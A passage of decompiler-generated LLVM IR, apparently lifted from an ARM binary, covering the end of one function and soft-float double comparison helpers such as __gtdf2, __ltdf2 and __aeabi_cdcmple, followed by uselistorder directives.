  %v1_13358 = icmp ne i32 %v1_13354, %v0_13354
  call void @__pseudo_cond_branch(i1 %v1_13358, i32 ptrtoint (i32* @global_var_1317c.768 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_13364 = call i32 @function_13194(i32 %arg3, i32 %arg4)
  store i32 %v2_13364, i32* %r0.global-to-local, align 4
  %v1_13368.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13368

dec_label_pc_13368:                               ; preds = %bb113, %dec_label_pc_1334c
  %v1_13368 = phi i32 [ %v1_13344, %bb113 ], [ %v1_13368.pre, %dec_label_pc_1334c ]
  %v0_13368 = load i32, i32* @r5, align 4
  %v4_13368 = icmp eq i32 %v0_13368, %v1_13368
  br i1 %v4_13368, label %dec_label_pc_13370, label %dec_label_pc_13368.dec_label_pc_13384_crit_edge

dec_label_pc_13368.dec_label_pc_13384_crit_edge:  ; preds = %dec_label_pc_13368
  %v1_13384.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13384

dec_label_pc_13370:                               ; preds = %dec_label_pc_13368
  %v4_13370 = mul i32 %arg3, 4096
  %v5_13370 = or i32 %v4_13370, %arg4
  store i32 %v5_13370, i32* %r5.global-to-local, align 4
  %v7_13370 = icmp eq i32 %v5_13370, 0
  call void @__pseudo_cond_branch(i1 %v7_13370, i32 ptrtoint (i32* @global_var_13130.769 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_13380 = call i32 @function_13194(i32 %arg3, i32 %arg4)
  store i32 %v2_13380, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13384

dec_label_pc_13384:                               ; preds = %dec_label_pc_13368.dec_label_pc_13384_crit_edge, %dec_label_pc_13370
  %v1_13384 = phi i32 [ %v1_13384.pre, %dec_label_pc_13368.dec_label_pc_13384_crit_edge ], [ %v2_13380, %dec_label_pc_13370 ]
  %v0_13384 = load i32, i32* @r1, align 4
  %v3_13384 = mul i32 %v1_13384, 2
  %v4_13384 = or i32 %v3_13384, %v0_13384
  store i32 %v4_13384, i32* %r6.global-to-local, align 4
  %v6_13384 = icmp eq i32 %v4_13384, 0
  br i1 %v6_13384, label %dec_label_pc_13384._crit_edge, label %bb114

dec_label_pc_13384._crit_edge:                    ; preds = %dec_label_pc_13384
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_13384
  %v4_13388 = mul i32 %arg3, 2
  %v5_13388 = or i32 %v4_13388, %arg4
  store i32 %v5_13388, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_13388, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_13384._crit_edge, %bb114
  %v4_13398.pre-phi = phi i32 [ %.pre80, %dec_label_pc_13384._crit_edge ], [ %v5_13388, %bb114 ]
  %v0_1338c = phi i1 [ false, %dec_label_pc_13384._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_1338c, i32 ptrtoint (i32* @global_var_130c8.770 to i32))
  %v0_13390 = load i32, i32* @r1, align 4
  %v1_13390 = load i32, i32* %r0.global-to-local, align 4
  %v3_13390 = mul i32 %v1_13390, 2
  %v4_13390 = or i32 %v3_13390, %v0_13390
  store i32 %v4_13390, i32* %r4.global-to-local, align 4
  %v1_13394 = icmp ne i32 %v4_13390, 0
  call void @__pseudo_cond_branch(i1 %v1_13394, i32 ptrtoint (i32* @global_var_1317c.768 to i32))
  store i32 %v4_13398.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1339c = icmp ne i32 %v4_13398.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1339c, i32 ptrtoint (i32* @global_var_13130.769 to i32))
  %v0_133a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_133a0 = load i32, i32* @r1, align 4
  %v2_133a0 = call i32 @function_13194(i32 %v0_133a0, i32 %v1_133a0)
  store i32 %v2_133a0, i32* %r0.global-to-local, align 4
  ret i32 %v2_133a0

; uselistorder directives
  uselistorder i32 %v5_13388, { 1, 0, 2 }
  uselistorder i32 %v1_13344, { 1, 0 }
  uselistorder i32 %v10_13310, { 2, 0, 1 }
  uselistorder i32 %v6_1330c, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_13308, { 1, 0, 2 }
  uselistorder i32 %v2_132f0, { 1, 0, 2 }
  uselistorder i32 %v1_132f0, { 1, 0, 2 }
  uselistorder i32 %v1_132ec, { 1, 0, 2 }
  uselistorder i32 %v0_132ec, { 1, 0, 2 }
  uselistorder i1 %v7_132e0, { 1, 0 }
  uselistorder i32 %v2_132c4, { 1, 0 }
  uselistorder i32 %v3_132b0, { 2, 1, 0 }
  uselistorder i32 %v3_132a4, { 0, 2, 1 }
  uselistorder i32 %v5_132a0, { 2, 0, 1 }
  uselistorder i32 %v6_13290, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1327c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_13278, { 3, 0, 2, 1 }
  uselistorder i32 %v0_13284, { 0, 2, 1 }
  uselistorder i32 %v1_13290, { 1, 0 }
  uselistorder i32 %v6_13274, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_13260, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1325c, { 0, 2, 1 }
  uselistorder i32 %v0_13268, { 0, 2, 1 }
  uselistorder i32 %v1_13274, { 1, 0 }
  uselistorder i32 %v6_13258, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_13244, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1324c, { 0, 2, 1 }
  uselistorder i32 %v1_13258, { 1, 0 }
  uselistorder i32 %v3_1323c, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_13230, { 1, 2, 0 }
  uselistorder i32 %v3_132b013, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_132ac17, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_13230, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1323c, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_132d8.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1321c, { 1, 0 }
  uselistorder i32 %v0_13220, { 1, 0 }
  uselistorder i32 %v3_1320c, { 1, 0 }
  uselistorder i1 %v1_13200, { 1, 0 }
  uselistorder i32 %v3_131f0, { 2, 3, 1, 0 }
  uselistorder i32 %v5_131ec, { 3, 2, 1, 0 }
  uselistorder i32 %v3_131e4, { 2, 1, 0 }
  uselistorder i32 %v5_131e0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_131c0, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_131b0, { 2, 3, 1, 0 }
  uselistorder i32 %v5_131b0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_131ac, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_131ac, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_131a0, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 7, 2, 3, 4, 5, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 18, 19, 20, 21, 3, 16, 17, 4, 13, 14, 15, 5, 2, 6, 7, 10, 8, 9, 11, 12, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 9, 6, 7, 8, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_13194, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_13018, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 1024, { 2, 0, 13, 14, 3, 15, 1, 10, 11, 12, 4, 8, 5, 7, 9, 6 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 1, 22, 23, 24, 25, 4, 8, 9, 10, 7, 31, 29, 30, 11, 6, 27, 28, 0, 26, 3, 5 }
  uselistorder i32 536870912, { 2, 3, 0, 1, 4 }
  uselistorder i32 16, { 1, 6, 4, 5, 7, 8, 9, 10, 27, 11, 12, 2, 13, 14, 15, 28, 16, 17, 3, 18, 19, 55, 56, 57, 0, 58, 59, 20, 21, 60, 61, 22, 62, 63, 64, 65, 77, 78, 72, 73, 33, 34, 35, 99, 36, 100, 101, 37, 102, 103, 38, 104, 105, 106, 107, 108, 109, 66, 67, 68, 79, 80, 81, 82, 83, 84, 85, 89, 90, 91, 86, 39, 92, 31, 52, 40, 46, 49, 47, 74, 75, 110, 30, 69, 70, 93, 94, 95, 96, 97, 98, 45, 87, 88, 48, 23, 71, 29, 24, 25, 26, 42, 50, 51, 41, 43, 53, 54, 32, 44, 76 }
  uselistorder i32 8, { 3, 4, 5, 6, 7, 8, 54, 9, 55, 31, 10, 11, 22, 12, 56, 32, 13, 14, 23, 15, 73, 74, 75, 76, 0, 1, 77, 78, 79, 80, 81, 16, 82, 60, 48, 49, 57, 83, 84, 85, 86, 28, 87, 108, 98, 146, 39, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 40, 88, 109, 110, 111, 112, 113, 114, 115, 116, 117, 17, 41, 118, 37, 119, 120, 58, 121, 122, 123, 124, 125, 126, 163, 33, 61, 18, 65, 72, 62, 63, 38, 102, 101, 99, 100, 66, 67, 68, 95, 96, 97, 103, 104, 105, 19, 106, 107, 2, 162, 44, 45, 42, 43, 24, 25, 35, 36, 46, 164, 129, 89, 90, 130, 131, 59, 132, 133, 134, 135, 29, 136, 50, 51, 137, 138, 139, 47, 140, 141, 142, 143, 34, 26, 27, 144, 145, 52, 127, 128, 64, 91, 92, 30, 93, 94, 20, 53, 21, 69, 70, 71 }
  uselistorder i32 4, { 8, 9, 133, 10, 11, 67, 217, 218, 134, 12, 13, 219, 220, 135, 14, 15, 162, 16, 87, 88, 89, 163, 164, 165, 166, 167, 168, 169, 0, 17, 61, 170, 171, 172, 173, 174, 175, 176, 59, 177, 90, 91, 92, 178, 179, 81, 180, 70, 181, 18, 19, 1, 144, 221, 222, 223, 224, 225, 182, 183, 184, 93, 94, 95, 96, 82, 97, 98, 99, 100, 101, 102, 187, 103, 104, 194, 195, 83, 105, 20, 226, 21, 80, 71, 72, 22, 266, 73, 63, 23, 24, 74, 75, 267, 268, 269, 270, 76, 271, 272, 273, 274, 77, 275, 276, 277, 278, 279, 25, 280, 281, 282, 283, 284, 78, 62, 285, 286, 287, 288, 289, 290, 26, 27, 79, 188, 189, 84, 227, 228, 229, 230, 85, 231, 232, 233, 234, 235, 60, 236, 237, 238, 239, 241, 240, 242, 291, 292, 293, 295, 296, 106, 107, 108, 262, 263, 264, 265, 28, 138, 109, 139, 110, 64, 140, 145, 111, 146, 147, 2, 156, 157, 158, 159, 112, 113, 141, 114, 3, 115, 142, 29, 143, 65, 116, 117, 204, 206, 205, 202, 203, 148, 149, 150, 151, 196, 197, 198, 199, 207, 208, 209, 200, 201, 210, 211, 212, 213, 214, 215, 4, 30, 216, 294, 243, 31, 32, 33, 34, 5, 118, 53, 35, 36, 152, 119, 37, 120, 121, 122, 123, 124, 244, 38, 245, 125, 246, 247, 248, 249, 250, 251, 252, 126, 253, 254, 255, 256, 257, 258, 54, 261, 127, 128, 260, 136, 259, 190, 191, 86, 192, 193, 185, 186, 39, 40, 68, 66, 41, 42, 153, 43, 44, 45, 46, 47, 129, 48, 130, 55, 69, 56, 57, 6, 7, 154, 49, 155, 131, 50, 160, 58, 51, 161, 52, 132, 137 }
  uselistorder i32 32, { 54, 55, 56, 57, 20, 21, 27, 33, 34, 23, 58, 22, 28, 59, 60, 61, 62, 26, 63, 40, 41, 42, 0, 43, 44, 35, 4, 3, 6, 5, 8, 7, 52, 53, 29, 30, 24, 64, 31, 16, 65, 66, 38, 39, 1, 25, 47, 45, 46, 67, 15, 68, 2, 32, 69, 70, 71, 72, 73, 17, 74, 36, 37, 48, 49, 50, 51, 10, 9, 12, 11, 18, 19, 14, 13 }
  uselistorder i32 33, { 2, 3, 4, 0, 5, 6, 1 }
  uselistorder i32 768, { 2, 0, 1 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 120, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 115, 69, 70, 122, 71, 123, 72, 124, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 116, 1, 87, 86, 85, 90, 89, 88, 91, 92, 93, 94, 121, 95, 96, 97, 114, 102, 98, 99, 103, 100, 101, 104, 105, 110, 106, 107, 109, 108, 111, 113, 112, 117, 118, 119 }
  uselistorder i32 1048576, { 19, 0, 1, 2, 20, 21, 13, 3, 4, 5, 22, 6, 7, 23, 24, 14, 15, 8, 9, 25, 26, 27, 18, 28, 10, 16, 11, 17, 12 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 13, 140, 141, 142, 143, 144, 145, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 11, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 1, 0, 17, 18, 19, 20, 21, 85, 2, 86, 87, 88, 89, 90, 91, 92, 146, 3, 147, 148, 149, 93, 97, 96, 98, 99, 100, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 130, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 4, 161, 162, 163, 164, 165, 166, 167, 195, 200, 193, 194, 22, 23, 24, 27, 28, 29, 30, 25, 26, 31, 32, 33, 34, 35, 36, 37, 38, 131, 128, 129, 132, 133, 5, 134, 135, 136, 137, 138, 139, 6, 168, 169, 170, 171, 172, 173, 174, 175, 176, 101, 102, 103, 104, 105, 7, 12, 106, 39, 8, 40, 41, 107, 9, 108, 109, 177, 178, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 14, 15, 16, 179, 180, 181, 182, 196, 197, 198, 199, 110, 111, 112, 113, 10, 114, 115, 116, 117, 94, 95, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32* @r5, { 185, 186, 187, 28, 188, 189, 190, 191, 192, 193, 194, 195, 31, 32, 196, 33, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 75, 76, 77, 78, 79, 80, 81, 8, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 5, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 25, 34, 9, 3, 35, 111, 115, 112, 113, 114, 21, 120, 116, 117, 118, 119, 121, 122, 123, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 10, 219, 220, 283, 284, 285, 124, 128, 11, 130, 129, 4, 131, 12, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 160, 159, 23, 167, 47, 48, 49, 50, 51, 52, 292, 293, 221, 222, 223, 224, 225, 226, 227, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 228, 0, 229, 230, 231, 232, 233, 234, 306, 307, 308, 309, 310, 1, 311, 312, 313, 286, 287, 288, 289, 290, 291, 36, 37, 38, 39, 40, 41, 42, 53, 13, 7, 54, 43, 44, 55, 56, 57, 58, 59, 60, 61, 168, 169, 170, 171, 172, 173, 161, 162, 163, 164, 165, 166, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 314, 315, 316, 317, 235, 14, 236, 237, 238, 239, 15, 240, 241, 242, 243, 244, 16, 134, 135, 136, 17, 132, 133, 62, 63, 64, 137, 138, 139, 245, 246, 26, 247, 248, 18, 249, 250, 251, 252, 253, 254, 24, 255, 256, 257, 258, 27, 262, 19, 263, 264, 265, 266, 267, 268, 269, 270, 6, 271, 272, 273, 274, 275, 276, 29, 30, 259, 2, 260, 261, 46, 45, 22, 318, 319, 140, 141, 142, 143, 20, 144, 145, 277, 278, 279, 280, 281, 282, 125, 126, 127, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74 }
  uselistorder i32 %arg4, { 3, 2, 9, 8, 7, 6, 5, 0, 1, 4, 10 }
  uselistorder i32 %arg3, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_13384, { 1, 0 }
  uselistorder label %dec_label_pc_13368, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_13334, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1322c, { 1, 0 }
  uselistorder label %dec_label_pc_13214, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_133a8 = call i32 @function_133b8()
  ret i32 %v0_133a8
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_133b0 = call i32 @function_133b8()
  ret i32 %v0_133b0

; uselistorder directives
  uselistorder i32 ()* @function_133b8, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_133b4 = load i32, i32* @r0, align 4
  ret i32 %v0_133b4
}

define i32 @function_133b8() local_unnamed_addr {
dec_label_pc_133b8:
  %v0_133b8 = load i32, i32* @ip, align 4
  %v0_133bc = load i32, i32* @r0, align 4
  %v2_133bc = mul i32 %v0_133bc, 2
  %v2_133bc.off = add i32 %v2_133bc, 4194303
  %tmp = icmp ult i32 %v2_133bc.off, 2097152
  %v0_133c4 = load i32, i32* @r2, align 4
  %v2_133c4 = mul i32 %v0_133c4, 2
  br i1 %tmp, label %dec_label_pc_13414, label %bb

bb:                                               ; preds = %dec_label_pc_133b8
  %v2_133c4.off = add i32 %v2_133c4, 4194303
  %tmp26 = icmp ult i32 %v2_133c4.off, 2097152
  br i1 %tmp26, label %dec_label_pc_13408, label %dec_label_pc_133d0

dec_label_pc_133d0:                               ; preds = %dec_label_pc_1341c, %dec_label_pc_13428, %bb
  %v0_133d0 = load i32, i32* @r1, align 4
  %v4_133d0 = or i32 %v0_133d0, %v2_133bc
  %v6_133d0 = icmp eq i32 %v4_133d0, 0
  br i1 %v6_133d0, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_133d0
  %v1_133d4 = load i32, i32* @r3, align 4
  %v5_133d4 = or i32 %v1_133d4, %v2_133c4
  %v7_133d4 = icmp eq i32 %v5_133d4, 0
  br i1 %v7_133d4, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_133d0, %bb14
  %v3_133d8 = xor i32 %v0_133c4, %v0_133bc
  %v5_133d8 = icmp eq i32 %v3_133d8, 0
  br i1 %v5_133d8, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_133dc.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_133dc = phi i32 [ %v2_133dc.pre, %.thread..thread1_crit_edge ], [ %v1_133d4, %bb14 ]
  %v5_133dc = icmp eq i32 %v2_133dc, %v0_133d0
  br i1 %v5_133dc, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_133c4, %v0_133bc
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_133ec.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_133d8, %.thread ]
  %v3_133ec = icmp slt i32 %v2_133ec.pre-phi, 0
  br i1 %v3_133ec, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_133f0 = icmp eq i32 %v0_133bc, %v0_133c4
  br i1 %v10_133f0, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_133f4 = load i32, i32* @r3, align 4
  %v4_133f4 = icmp ult i32 %v0_133d0, %v2_133f4
  br i1 %v4_133f4, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_133f0 = icmp ult i32 %v0_133bc, %v0_133c4
  br i1 %v4_133f0, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_133c4, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_133f8 = and i32 %v0_133c4, 1073741824
  %v3_133f8 = icmp eq i32 %v2_133f8, 0
  %v4_133f8 = ashr i32 %v0_133c4, 31
  br i1 %v3_133f8, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_133fc.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_133f8, %bb19 ]
  %v5_133fc = sub nsw i32 -1, %v4_133fc.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_13400 = phi i32 [ %v4_133f8, %bb19 ], [ %v5_133fc, %.thread7 ]
  %v1_13400 = or i32 %v0_13400, 1
  ret i32 %v1_13400

dec_label_pc_13408:                               ; preds = %bb
  br label %dec_label_pc_1341c

dec_label_pc_13414:                               ; preds = %dec_label_pc_133b8
  %v0_13414 = load i32, i32* @r1, align 4
  %v4_13414 = mul i32 %v0_133bc, 4096
  %v5_13414 = or i32 %v0_13414, %v4_13414
  %v7_13414 = icmp eq i32 %v5_13414, 0
  br i1 %v7_13414, label %dec_label_pc_13414.dec_label_pc_1341c_crit_edge, label %dec_label_pc_13430

dec_label_pc_13414.dec_label_pc_1341c_crit_edge:  ; preds = %dec_label_pc_13414
  %v2_133c4.off25 = add i32 %v2_133c4, 4194303
  %tmp27 = icmp ult i32 %v2_133c4.off25, 2097152
  br label %dec_label_pc_1341c

dec_label_pc_1341c:                               ; preds = %dec_label_pc_13414.dec_label_pc_1341c_crit_edge, %dec_label_pc_13408
  %v3_13420.pre-phi = phi i1 [ %tmp27, %dec_label_pc_13414.dec_label_pc_1341c_crit_edge ], [ true, %dec_label_pc_13408 ]
  br i1 %v3_13420.pre-phi, label %dec_label_pc_13428, label %dec_label_pc_133d0

dec_label_pc_13428:                               ; preds = %dec_label_pc_1341c
  %v0_13428 = load i32, i32* @r3, align 4
  %v4_13428 = mul i32 %v0_133c4, 4096
  %v5_13428 = or i32 %v0_13428, %v4_13428
  %v7_13428 = icmp eq i32 %v5_13428, 0
  br i1 %v7_13428, label %dec_label_pc_133d0, label %dec_label_pc_13430

dec_label_pc_13430:                               ; preds = %dec_label_pc_13414, %dec_label_pc_13428
  ret i32 %v0_133b8

; uselistorder directives
  uselistorder i32 %v4_133f8, { 1, 0 }
  uselistorder i32 %v1_133d4, { 1, 0 }
  uselistorder i32 %v0_133d0, { 2, 0, 1 }
  uselistorder i32 %v2_133c4, { 0, 2, 1 }
  uselistorder i32 %v0_133c4, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_133bc, { 1, 0 }
  uselistorder i32 %v0_133bc, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 31, { 15, 7, 5, 12, 13, 16, 6, 17, 1, 14, 4, 18, 3, 2, 0, 8, 10, 9, 11, 19, 20 }
  uselistorder i32* @r3, { 23, 24, 1, 25, 26, 27, 0, 28, 6, 29, 12, 5, 13, 14, 30, 31, 15, 39, 40, 2, 41, 42, 43, 3, 44, 45, 46, 4, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 32, 33, 34, 35, 72, 73, 10, 11, 19, 22, 20, 21, 8, 7, 16, 17, 36, 37, 9, 38, 18 }
  uselistorder i32* @r1, { 100, 101, 13, 102, 103, 104, 105, 106, 107, 14, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 28, 15, 29, 119, 30, 0, 4, 120, 12, 121, 122, 123, 124, 11, 125, 126, 127, 51, 52, 2, 53, 54, 24, 55, 58, 56, 57, 16, 17, 31, 59, 60, 61, 62, 63, 64, 65, 66, 5, 67, 68, 128, 69, 70, 71, 72, 75, 77, 78, 79, 80, 81, 82, 6, 32, 33, 19, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 8, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 7, 202, 203, 18, 73, 74, 129, 130, 131, 132, 133, 134, 135, 136, 137, 21, 25, 26, 204, 3, 205, 151, 47, 48, 83, 88, 89, 92, 90, 91, 84, 85, 86, 87, 34, 93, 99, 206, 207, 208, 138, 139, 140, 22, 141, 94, 95, 96, 97, 98, 9, 152, 153, 10, 20, 142, 143, 144, 1, 145, 146, 147, 23, 27, 148, 76, 149, 35, 150, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 49, 50, 154, 155 }
  uselistorder i32* @ip, { 18, 19, 20, 7, 21, 22, 23, 24, 25, 26, 27, 8, 9, 3, 28, 29, 30, 31, 10, 33, 32, 0, 34, 35, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 36, 37, 38, 39, 40, 41, 42, 43, 16, 17, 5, 14, 4, 15, 6, 13, 101, 98, 99, 100, 1, 102, 44, 45, 46, 47, 48, 2, 49, 50, 51, 52, 53, 54, 11, 12, 55 }
  uselistorder label %dec_label_pc_13430, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_133d0, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_13438 = load i32, i32* @r0, align 4
  %v0_1343c = load i32, i32* @r2, align 4
  store i32 %v0_1343c, i32* @r0, align 4
  store i32 %v0_13438, i32* @r2, align 4
  %v0_13450 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_13450
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_13454 = load i32, i32* @r0, align 4
  %v1_13458 = sext i32 %v3_13454 to i64
  %v2_13458 = bitcast i64 %v1_13458 to double
  %v3_13458 = load i32, i32* @r2, align 4
  %v4_13458 = sext i32 %v3_13458 to i64
  %v5_13458 = bitcast i64 %v4_13458 to double
  %v7_13458 = fcmp oeq double %v2_13458, %v5_13458
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_13458 = fcmp ule double %v2_13458, %v5_13458
  %not.v7_13458 = xor i1 %v7_13458, true
  %v1_1345c = and i1 %not.v6_13458, %not.v7_13458
  store i1 %v7_13458, i1* @cpsr_z, align 1
  br i1 %v1_1345c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_13458, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_13454

; uselistorder directives
  uselistorder i1 %v7_13458, { 1, 2, 0 }
